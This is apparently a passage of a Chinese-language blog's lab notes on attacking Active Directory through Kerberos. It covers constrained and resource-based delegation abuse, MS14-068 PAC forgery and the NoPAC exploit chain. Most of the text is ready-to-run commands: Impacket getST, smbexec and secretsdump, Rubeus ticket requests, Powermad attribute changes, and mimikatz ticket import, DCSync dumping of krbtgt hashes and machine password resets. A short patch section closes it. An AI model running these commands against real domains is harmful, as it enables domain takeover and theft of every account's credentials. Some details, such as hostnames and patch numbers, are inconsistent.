<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230219121231228.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230219121231228</span></p>
<p><strong>攻击流程</strong></p>
<p>首先我们拿到了win7的权限，是以aim账户登陆的</p>
<p>抓取密码为admin@123</p>
<p>查询是否存在约束性委派服务账户</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Adfind<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">b</span> <span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> msds-allowedtodelegateto<br></code></pre></td></tr></table></figure>

<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230219121926879.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230219121926879</span></p>
<p>发现存在CIFS服务的账户aim，然后就可以使用Impacket包攻击</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta">#以域管tony身份申请一张访问cifs服务的票据</span><br>python3 getST.py -dc-ip 域控ip sayms.<span class="hljs-keyword">local</span>/aim:admin<span class="hljs-symbol">@123</span> -spn cifs/DC.sayms.<span class="hljs-keyword">local</span> -impersonate tony<br><br><span class="hljs-meta">#导入票据</span><br>export KRB5CCNAME=tony.ccache<br><br><span class="hljs-meta">#远程访问域控</span><br>python3 smbexec.py -no-pass -k DC.sayms.<span class="hljs-keyword">local</span><br></code></pre></td></tr></table></figure>









<h4 id="基于受限资源的委派攻击"><a href="#基于受限资源的委派攻击" class="headerlink" title="基于受限资源的委派攻击"></a>基于受限资源的委派攻击</h4><p>我们拿到域内主机win2008的权限，且当前登陆为tom，而tom就是把win2008加入域的用户</p>
<p>因为win2008不在管理员组中，所以基本不可能进行mimikatz导出hash的操作</p>
<p>因为win2008是tom加入的，所以tom有给win2008基于资源的约束性委派的权限</p>
<p>首先新建机器账户test$，配置test$到win2008的基于资源的委派</p>
<p>然后执行如下命令，就可以提权到win2008的system权限</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#用administrator申请一个访问cifs/win2008的服务票据<br>python3 getST<span class="hljs-selector-class">.py</span> -dc-ip DC<span class="hljs-selector-class">.sayms</span><span class="hljs-selector-class">.local</span> sayms.local/test$<span class="hljs-selector-pseudo">:root</span> -spn cifs/win2008<span class="hljs-selector-class">.sayms</span><span class="hljs-selector-class">.local</span> -impersonate administrator<br><br>#导入票据<br>export KRB5CCNAME=administrator<span class="hljs-selector-class">.ccache</span><br><br>#远程访问win2008<br>python3 smbexec<span class="hljs-selector-class">.py</span> -no-pass -k win2008<span class="hljs-selector-class">.xie</span>.com<br></code></pre></td></tr></table></figure>







<h1 id="PAC攻击"><a href="#PAC攻击" class="headerlink" title="PAC攻击"></a>PAC攻击</h1><p>pac方面的攻击主要是几个著名的漏洞</p>
<h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><p>权限提升漏洞</p>
<h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p><font color='red'>密钥层面</font></p>
<p>PAC包含两个数字签名PAC_SERVER_CHECKSUM、PAC_PRIVSVR_CHECKSUM</p>
<p>这两个数字签名分别是服务的hash和krbtgt的hash加密的，使用checksum算法</p>
<p>但是使用该系列算法，是允许使用该系列的所有算法的，那么我们可以选用MD5算法</p>
<p>MD5算法是不需要密钥进行加密的，所以也就不需要服务和krbtgt的hash值</p>
<p><font color='red'>PAC放置问题</font></p>
<p>既然是伪造PAC，那么开始我们的TGT就不能产生PAC</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">客户端通过AS_REQ报文中设置PA-<span class="hljs-keyword">PAC</span>-REQUEST-PA-DATA为false<br>从而使<span class="hljs-keyword">AS</span>返回的TGT票据不包含<span class="hljs-keyword">PAC</span><br></code></pre></td></tr></table></figure>

<p>PAC伪造之后，TGT是krbtgt加密的，无法将伪造的PAC插入</p>
<p>接着考虑TGS_REQ数据包</p>
<p>TGS_REQ数据包包含TGT票据、认证因子</p>
<p>TGT票据是不行的，但是认证因子可以</p>
<p>这就为伪造PAC，创造了两个条件</p>
<p>就可以伪造高权限PAC去访问任何服务</p>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>域控：win2016    192.168.8.1</p>
<p>域内主机：win10    192.168.8.3</p>
<p>普通域用户    aim：admin@123</p>
<p>目前拿到win7的权限，是以aim登陆的，尝试提权到system</p>
<p>查看aim的SID</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /all<br></code></pre></td></tr></table></figure>

<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230220233515201.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230220233515201</span></p>
<p>利用MS14-068工具，生成票据</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MS14</span>-<span class="hljs-number">068</span>.exe -u aim@sayms.local -p admin@<span class="hljs-number">123</span> -s S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1800720312</span>-<span class="hljs-number">2905234279</span>-<span class="hljs-number">4070812641</span>-<span class="hljs-number">1105</span> -d <span class="hljs-number">192.168.8.1</span><br></code></pre></td></tr></table></figure>

<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230220234130475.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230220234130475</span></p>
<p>mimikatz导入票据</p>
<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">kerberos</span>::purge<br><br><span class="hljs-name">kerberos</span>::ptc <span class="hljs-name">C</span>:\Users\tom\Desktop\MS14<span class="hljs-number">-068</span>-master\TGT_tom@sayms.<span class="hljs-keyword">local</span>.ccache<br></code></pre></td></tr></table></figure>

<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230220234354895.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230220234354895</span></p>
<p>尝试连接域控</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> \\DC.sayms.local\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure>

<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230220234757712.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230220234757712</span></p>
<p>失败，应该是因为域控为win2016，已经更新该漏洞</p>
<h2 id="NoPAC"><a href="#NoPAC" class="headerlink" title="NoPAC"></a>NoPAC</h2><p>两个漏洞结合，可以实现权限提升</p>
<p>CVE-2021-42278、CVE-2021-42287</p>
<h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p><font color='red'>kerberos在处理username时，首先去找username，找不到就会去找username$，假如还找不到，就会去找altSecurityIdentities属性值对应的用户</font></p>
<p>其次是让KDC找不到原账户</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">跨域请求时，目标域找不到该域用户，所以会按照上面来找username<br><br>修改saMAccountName属性，修改该属性让KDC找不到用户，然后就来找username<br></code></pre></td></tr></table></figure>



<p>PAC机制</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">AS</span>可以和用户协商，返回的TGT中不包含<span class="hljs-keyword">PAC</span><br><br><span class="hljs-keyword">ST</span>中的<span class="hljs-keyword">PAC</span>是复制TGT的，TGT中无<span class="hljs-keyword">PAC</span>，在正常情况下<span class="hljs-keyword">ST</span>中也是无<span class="hljs-keyword">PAC</span>的<br></code></pre></td></tr></table></figure>



<p>最后就是考虑伪造PAC，而<font color='red'>TGT中的PAC是预身份认证生成的，无法伪造</font>，就只能考虑ST中的PAC</p>
<p>ST中的PAC是直接复制TGT的PAC，所以首先应该考虑不然ST复制TGT中的PAC</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">KDC在跨域的TGS_REQ中，如果TGT无<span class="hljs-keyword">PAC</span>，会重新生成<br><br>KDC在处理S4u2Self的TGS_REQ时，<span class="hljs-keyword">PAC</span>是重新生成的<br></code></pre></td></tr></table></figure>





<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>首先用原有用户生成机器账户server$</p>
<p>修改机器账户server$的saMAccountName属性中的altSecurityIdentities的值为域控机器名字DC</p>
<p>然后用DC账户请求TGT</p>
<p>修改机器账户的saMAccountName属性的altSecurityIdentities的值为server$，即还原</p>
<p>然后用域管账户以S4u2Self协议，带上TGT来申请域控的服务</p>
<p>此时，KDC会查找DC这个账户，因为修改了saMAccountName属性，找不到DC账户，接着寻找DC$，此时找到了域控</p>
<p>然后就会以域控身份发起S4u2Self协议来访问自身的服务，此时就会返回域管的ST</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">需要注意的是，在域中，机器账户可以利用S4u2Self协议，来模拟任意用户来访问自身的SPN<br></code></pre></td></tr></table></figure>





<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>根据上面思路</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">创建机器账户<br><br>修改机器账户的saMAccountName属性<br><br>用修改之后的属性，请求TGT<br><br>复原机器账户的属性<br><br>以S4u2Self协议，发起请求<span class="hljs-keyword">ST</span><br><br>提权成功<br></code></pre></td></tr></table></figure>



<h4 id="创建机器账户"><a href="#创建机器账户" class="headerlink" title="创建机器账户"></a>创建机器账户</h4><p>普通域内用户默认最多创建10个机器账户</p>
<p>普通域内账户的ms-DS-MachineAccountQuota属性来决定，默认该属性的值为10</p>
<p><strong>python脚本创建</strong></p>
<p>利用SAMR协议远程创建机器账户</p>
<p>创建的账户是没有SPN的</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">python3 addcomputer.py -computer-name <span class="hljs-string">&#x27;server&#x27;</span> -computer-pass <span class="hljs-string">&#x27;root&#x27;</span> -dc-ip 域控ip <span class="hljs-string">&#x27;sayms,local/tom:admin@12345&#x27;</span> -<span class="hljs-keyword">method</span> <span class="hljs-title function_">SARM</span> -<span class="hljs-title function_">debug</span><br></code></pre></td></tr></table></figure>



<p><strong>powershell脚本创建</strong></p>
<p>创建的账户是有SPN的</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Import</span>-Module .\<span class="hljs-built_in">New</span>-MachineAccount.ps1<br><span class="hljs-built_in">New</span>-MachineAccount -MachineAccount <span class="hljs-keyword">server</span> -<span class="hljs-keyword">Password</span> root<br></code></pre></td></tr></table></figure>

<p>那么就需要清除掉</p>
<p>在创建的机器账户server$上执行命令去除</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-operator">.</span>\<span class="hljs-variable">powerview</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><br><span class="hljs-built_in">Set</span><span class="hljs-operator">-</span><span class="hljs-variable">DomainObject</span> <span class="hljs-string">&quot;CN=server,CN=Computers,DC=sayms,DC=local&quot;</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Clear</span> <span class="hljs-operator">&#x27;</span><span class="hljs-variable">serviceprincipalname</span><span class="hljs-operator">&#x27;</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Verbose</span><br></code></pre></td></tr></table></figure>

<p>远程去除，需要提供一个拥有去除SPN权限的用户</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python3 addspn<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&#x27;sayms.local\tom&#x27;</span> -<span class="hljs-selector-tag">p</span> admin@<span class="hljs-number">12345</span> -t <span class="hljs-string">&#x27;server$&#x27;</span> -<span class="hljs-selector-tag">p</span> 域控ip<br></code></pre></td></tr></table></figure>





<h4 id="修改saMAcconutName属性"><a href="#修改saMAcconutName属性" class="headerlink" title="修改saMAcconutName属性"></a>修改saMAcconutName属性</h4><p>在创建server$的主机上面修改</p>
<p><strong>powershell</strong></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Import</span>-Module .\Powermad.ps1<br><br>#查询<br><span class="hljs-keyword">Get</span>-MachineAccountAttribute -MachineAccount <span class="hljs-keyword">server</span> -<span class="hljs-keyword">Attribute</span> saMAccountName<br><br>#修改<br><span class="hljs-keyword">Set</span>-MachineAccountAttribute -MachineAccount <span class="hljs-keyword">server</span> -<span class="hljs-keyword">Value</span> &quot;DC&quot; -<span class="hljs-keyword">Attribute</span> saMAccountName -<span class="hljs-keyword">Verbose</span><br></code></pre></td></tr></table></figure>



<p><strong>python脚本</strong></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">python3 renameMachine.py -<span class="hljs-keyword">current</span>-<span class="hljs-type">name</span> <span class="hljs-string">&#x27;server$&#x27;</span> -<span class="hljs-built_in">new</span>-<span class="hljs-type">name</span> <span class="hljs-string">&#x27;DC&#x27;</span> -dc-ip DC.sayms.<span class="hljs-keyword">local</span> sayms.<span class="hljs-keyword">local</span>/tom:<span class="hljs-keyword">admin</span>@<span class="hljs-number">12345</span><br></code></pre></td></tr></table></figure>





<h4 id="请求TGT"><a href="#请求TGT" class="headerlink" title="请求TGT"></a>请求TGT</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rubeus.exe asktgt /user:<span class="hljs-string">&quot;DC&quot;</span> /password:<span class="hljs-string">&quot;root&quot;</span> /domain:<span class="hljs-string">&quot;sayms.local&quot;</span> /dc:<span class="hljs-string">&quot;DC.sayms.local&quot;</span> /nowrap /ptt<br></code></pre></td></tr></table></figure>







<h4 id="复原saMAcconutName属性"><a href="#复原saMAcconutName属性" class="headerlink" title="复原saMAcconutName属性"></a>复原saMAcconutName属性</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Import</span>-Module .\Powermad.ps1<br><br>#查询<br><span class="hljs-keyword">Get</span>-MachineAccountAttribute -MachineAccount <span class="hljs-keyword">server</span> -<span class="hljs-keyword">Attribute</span> saMAccountName<br><br>#修改<br><span class="hljs-keyword">Set</span>-MachineAccountAttribute -MachineAccount <span class="hljs-keyword">server</span> -<span class="hljs-keyword">Value</span> &quot;server&quot; -<span class="hljs-keyword">Attribute</span> saMAccountName -<span class="hljs-keyword">Verbose</span><br></code></pre></td></tr></table></figure>







<p><strong>请求ST</strong></p>
<p>用S4u2Self协议以administrator身份请求ldap/DC.sayms.local服务的ST</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Rubeus.exe s4u /self /impersonateuser:<span class="hljs-string">&quot;administator&quot;</span> /altservice:<span class="hljs-string">&quot;ldap/DC.sayms.local&quot;</span> /dc:<span class="hljs-string">&quot;DC.sayms.local&quot;</span> /ptt /ticket:上面的TGT,<span class="hljs-built_in">base64</span>格式<br></code></pre></td></tr></table></figure>





<h4 id="验证是否有高权限"><a href="#验证是否有高权限" class="headerlink" title="验证是否有高权限"></a>验证是否有高权限</h4><p>导出krbtgt的hash</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsadump::dcsync /domain:sayms.local /user:krbtgt /csv<br></code></pre></td></tr></table></figure>







<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>可以看到，这个漏洞的利用，不管是原理还是操作，都是有些复杂的</p>
<p>但是有比较方便的工具</p>
<h4 id="nopac-exe"><a href="#nopac-exe" class="headerlink" title="nopac.exe"></a>nopac.exe</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">nopac.exe -<span class="hljs-keyword">domain</span> sayms.<span class="hljs-keyword">local</span> -<span class="hljs-keyword">user</span> tom -pass <span class="hljs-keyword">admin</span>@<span class="hljs-number">12345</span> /dc DC.sayms.<span class="hljs-keyword">local</span> /mAccount <span class="hljs-keyword">server</span> /mPassword root /service cifs /ptt<br></code></pre></td></tr></table></figure>

<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230222232825297.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230222232825297</span></p>
<p>然后就可以使用mimikatz直接导出任意用户的hash</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">kerberos::list<br><br>lsadump::dcsync /domain:sayms.local /user:krbtgt /csv<br></code></pre></td></tr></table></figure>





<h4 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">#创建机器用户<br>python3 addcomputer.py -computer-<span class="hljs-type">name</span> <span class="hljs-string">&#x27;server&#x27;</span> -computer-pass <span class="hljs-string">&#x27;root&#x27;</span> -dc-ip <span class="hljs-number">192.168</span><span class="hljs-number">.8</span><span class="hljs-number">.1</span> <span class="hljs-string">&#x27;sayms.local/tom:admin@12345&#x27;</span> -<span class="hljs-keyword">method</span> SAMR<br><br><br>#修改机器用户的saMAcconutName属性为DC<br>python3 renameMachine.py -<span class="hljs-keyword">current</span>-<span class="hljs-type">name</span> <span class="hljs-string">&#x27;server$&#x27;</span> -<span class="hljs-built_in">new</span>-<span class="hljs-type">name</span> <span class="hljs-string">&#x27;DC&#x27;</span> -dc-ip <span class="hljs-number">192.168</span><span class="hljs-number">.8</span><span class="hljs-number">.1</span> sayms.<span class="hljs-keyword">local</span>/tom:<span class="hljs-keyword">admin</span>@<span class="hljs-number">12345</span><br><br><br>#以<span class="hljs-keyword">server</span>$的身份去请求TGT，用户名为DC<br>python3 getTGT.py -dc-ip <span class="hljs-number">192.168</span><span class="hljs-number">.8</span><span class="hljs-number">.1</span> sayms/DC:root<br><br><br>#导入TGT<br>export KRB5CCNAME=DC.ccache<br><br><br>#恢复saMAcconutName属性<br>python3 renameMachine.py -<span class="hljs-keyword">current</span>-<span class="hljs-type">name</span> <span class="hljs-string">&#x27;DC&#x27;</span> -<span class="hljs-built_in">new</span>-<span class="hljs-type">name</span> <span class="hljs-string">&#x27;server$&#x27;</span> -dc-ip DC.sayms.<span class="hljs-keyword">local</span> sayms.<span class="hljs-keyword">local</span>/tom:<span class="hljs-keyword">admin</span>@<span class="hljs-number">12345</span><br><br><br>#以S4u2Self协议，用administrator身份去请求域控DC.sayms.<span class="hljs-keyword">local</span>的服务<br>python3 getST.py -spn cifs/DC.sayms,<span class="hljs-keyword">local</span> sayms/DC@域控ip -<span class="hljs-keyword">no</span>-pass -k -dc-ip 域控ip -impersonate administrator -self<br><br><br><br>#导入ST<br>export KRB5CCNAME=administrator.ccache<br><br><br><br>#验证，导出krbtgt的hash<br>python3 secretsdump.py DC.sayms.<span class="hljs-keyword">local</span> -k -<span class="hljs-keyword">no</span>-pass -just-dc-<span class="hljs-keyword">user</span> krbtgt<br></code></pre></td></tr></table></figure>





<h4 id="sam-the-admin"><a href="#sam-the-admin" class="headerlink" title="sam_the_admin"></a>sam_the_admin</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#获取权限</span><br>python3 sam_the_admin.py <span class="hljs-string">&quot;sayms/tom:admin@12345&quot;</span> -dc-ip 域控ip -shell<br><br><br><span class="hljs-comment">#导出hash</span><br>python3 sam_the_admin.py <span class="hljs-string">&quot;sayms/tom:admin@12345&quot;</span> -dc-ip 域控ip -<span class="hljs-keyword">dump</span><br></code></pre></td></tr></table></figure>

<p><font color='red'>相比较来说，sam_the_admin最容易实现</font></p>
<h3 id="MAQ为0的攻击"><a href="#MAQ为0的攻击" class="headerlink" title="MAQ为0的攻击"></a>MAQ为0的攻击</h3><p>MAQ是普通域内用户账户能够添加机器账户的数量，默认为10，如果设置为0，我们就无法按照上面的方法进行nopac攻击</p>
<p>此时就考虑到用域内已经存在的机器账户，拿来利用</p>
<p>对于修改saMAccountName属性，发现只有域管和将主机加入域的用户，才能对该属性进行修改</p>
<p>然后下面的利用就分为两种情况</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">获得了域内已经存在的机器权限<br><br>获取了将机器加入域的用户权限<br></code></pre></td></tr></table></figure>



<p><strong>如果获得了域内已经存在的机器权限</strong></p>
<p>如果我们获取了域内一台主机的最高权限，<strong>假设是WIN7</strong></p>
<p>首先找，是谁将该主机加入的域</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stata">先查取该机器的mS-<span class="hljs-keyword">DS</span>-CreatorSID属性，找到SID<br>然后用该SID，找到对应用户，即将该主机加入域的用户<br><br>#查取mS-<span class="hljs-keyword">DS</span>-CreatorSID属性<br>AdFind.exe -f <span class="hljs-string">&quot;&amp;(objectcategory=computer)(name=win10)&quot;</span> mS-<span class="hljs-keyword">DS</span>-CreatorSID<br><br>#找到SID对应的用户<br>AdFind.exe -<span class="hljs-keyword">sc</span> adsid:刚才查询的SID值 -dn<br></code></pre></td></tr></table></figure>



<p>假如通过上面的发现，是tom将主机加入的域</p>
<p>想要接着后续利用，就想要知道tom的密码</p>
<p>先查询WIN7$的SPN，需要WIN7的hash值，因为前提是我们已经拿到了WIN7的权限，所以直接用mimikatz导出hash</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python3 addspn<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&#x27;xie.com\WIN7$&#x27;</span> -P 哈希值 -t <span class="hljs-string">&#x27;win10$&#x27;</span> -<span class="hljs-selector-tag">q</span> 域控ip<br></code></pre></td></tr></table></figure>



<p>然后删除SPN</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> addspn.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&#x27;xie.com\WIN7$&#x27;</span> -<span class="hljs-keyword">P</span> 哈希值 -t <span class="hljs-string">&#x27;win10$&#x27;</span> -<span class="hljs-keyword">c</span> 域控ip<br></code></pre></td></tr></table></figure>



<p>然后和以前一样</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">将机器账户的saMAccountName属性修改为域控名<br><br>以机器账户身份申请TGT<br><br>导入TGT<br><br>恢复saMAccountName属性<br><br>申请<span class="hljs-keyword">ST</span><br><br>导入<span class="hljs-keyword">ST</span><br></code></pre></td></tr></table></figure>







<p><strong>如果获取了将机器加入域的用户权限</strong></p>
<p>前提，是tom将WIN7加入的域</p>
<p>现在我们获得了tom的权限</p>
<p>从上面可以知道，我们使用有权限的WIN7，唯一用的就是WIN7$的hash</p>
<p>现在就算没有win7的权限，我们只需要想办法，把WIN7$的hash弄出来就行</p>
<p>我们现在拥有tom这个特殊账户的权限，可以考虑用tom拿到hash</p>
<p>通过mimikatz，利用SAMR协议，修改win7$密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsadump::SETNTLM /server:域控ip /user:win7$ /password:123456<br></code></pre></td></tr></table></figure>



<p>获取到密码之后，用法就和上面一样了</p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>主要是两个补丁KB5008102、KB5008308</p>
<p><strong>KB5008102</strong></p>
<p>主要是检查非管理员权限的用户创建或者修改saMAccountName属性和UserAccountControl属性，需要进行检查</p>
<p><strong>KB5008380</strong></p>
<p>在TGS_REP阶段，会将TGT中的pac和TGS_REQ中的pac进行检查，查看两个pac的信息是否相同</p>
<h1 id="整体总结"><a href="#整体总结" class="headerlink" title="整体总结"></a>整体总结</h1><p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230304150501801.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230304150501801</span></p>

      </section>
      <section class="extra">
        
        
        
